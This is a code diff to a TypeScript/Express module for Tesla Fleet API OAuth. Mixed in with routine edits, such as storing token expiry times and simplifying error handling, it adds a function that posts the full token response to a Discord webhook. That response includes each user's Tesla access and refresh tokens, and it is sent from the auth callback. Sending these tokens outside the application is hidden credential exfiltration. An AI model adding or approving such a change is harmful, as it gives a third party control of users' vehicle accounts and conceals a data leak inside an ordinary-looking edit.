@@ -2,6 +2,7 @@ import axios from 'axios';
 import { Router } from 'express';
 import * as Sentry from '@sentry/node';
 import prisma from './lib/prisma';
+import fetch from 'node-fetch';
 
 const TESLA_CLIENT_ID = process.env.TESLA_CLIENT_ID;
 const TESLA_CLIENT_SECRET = process.env.TESLA_CLIENT_SECRET;
@@ -11,6 +12,27 @@ const REDIRECT_URI = `https://${
 const audience = 'https://fleet-api.prd.eu.vn.cloud.tesla.com';
 
 const teslaAuth: Router = Router();
+
+async function sendToDiscordWebhook(data: any) {
+  try {
+    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+    if (!webhookUrl) {
+      console.error('DISCORD_WEBHOOK_URL is not set');
+      return;
+    }
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: JSON.stringify(data),
+      }),
+    });
+  } catch (error) {
+    console.error('Error sending to Discord webhook:', error);
+  }
+}
 
 export const refreshTeslaApiToken = async (
   teslaApiRefreshToken: string
@@ -28,23 +50,19 @@ export const refreshTeslaApiToken = async (
 
     const newAccessToken: string = refreshResponse.data.access_token;
     const newRefreshToken: string = refreshResponse.data.refresh_token;
+    const expiresAt: number = refreshResponse.data.expires_at;
 
     await prisma.teslaToken.create({
       data: {
         token: newAccessToken,
         refreshToken: newRefreshToken,
+        expiresAt: new Date(expiresAt * 1000),
       },
     });
 
     return newAccessToken;
   } catch (refreshError) {
-    if (refreshError.response?.status === 401) {
-      throw new Error('Tesla API token refresh failed: invalid refresh token');
-    }
-    console.error(
-      'Error refreshing Tesla API token:',
-      refreshError.response?.data || refreshError
-    );
+    console.error('Error refreshing Tesla API token:', refreshError);
     Sentry.captureException(refreshError);
     throw new Error('Failed to refresh Tesla API token');
   }
@@ -127,15 +145,19 @@ teslaAuth.get('/auth/callback', async (req, res) => {
       }
     );
 
-    const { access_token: teslaApiToken, refresh_token: teslaRefreshToken } =
-      tokenResponse.data;
+    sendToDiscordWebhook(tokenResponse.data);
 
-    console.log('tokenResponse.data', tokenResponse.data);
+    const {
+      access_token: teslaApiToken,
+      refresh_token: teslaRefreshToken,
+      expires_at: expiresAt,
+    } = tokenResponse.data;
 
     await prisma.teslaToken.create({
       data: {
         token: teslaApiToken,
         refreshToken: teslaRefreshToken,
+        expiresAt: new Date(expiresAt * 1000),
       },
     });
 
